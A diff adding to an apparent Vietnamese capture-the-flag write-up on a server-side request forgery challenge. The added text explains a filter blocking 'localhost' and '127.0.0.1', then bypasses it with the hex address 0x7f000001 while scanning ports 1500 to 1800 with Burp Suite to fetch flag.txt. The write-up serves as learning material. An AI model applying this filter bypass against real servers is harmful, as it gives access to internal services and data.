@@ -16,3 +16,24 @@ Mã hóa từ base 64 ta được:
 <h1>Not Found</h1>
 <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
 ```
+Web server có hàm xử lý URL kiểu như:
+
+Nếu tham số truyền vào là "/", thì URL = "http://localhost:8000/".
+
+Nếu URL chứa "localhost" hoặc "127.0.0.1"
+→ chặn, trả về error.png.
+
+Nếu không bị chặn:
+
+Lấy nội dung của đường dẫn đó trên server local,
+
+Base64 encode,
+
+Sau đó render ảnh.
+Dùng tool của Burbsuit thay từng cổng vào ta nhận được flag 
+`
+http://0x7f000001:1500/flag.txt
+http://0x7f000001:1501/flag.txt
+...
+http://0x7f000001:1800/flag.txt
+`
